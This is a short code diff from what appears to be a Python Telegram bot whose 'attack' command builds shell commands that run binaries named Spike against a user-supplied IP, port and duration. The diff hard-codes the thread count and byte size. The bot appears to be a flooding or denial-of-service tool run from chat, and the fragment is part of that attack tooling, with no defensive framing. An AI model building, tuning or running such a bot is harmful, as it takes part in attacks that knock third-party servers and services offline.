@@ -418,9 +418,9 @@ async def attack(update: Update, context: CallbackContext):
     if argument_type == 3:
         attack_command = f"./Spike3 {ip} {port} {duration}"
     elif argument_type == 4:
-        attack_command = f"./Spike4 {ip} {port} {duration} {threads}"
+        attack_command = f"./Spike4 {ip} {port} {duration} 1000"
     elif argument_type == 5:
-        attack_command = f"./Spike {ip} {port} {duration} {byte_size} {threads}"
+        attack_command = f"./Spike {ip} {port} {duration} 9 1000"
 
     # Send attack details to the user
     await context.bot.send_message(chat_id=chat_id, text=( 
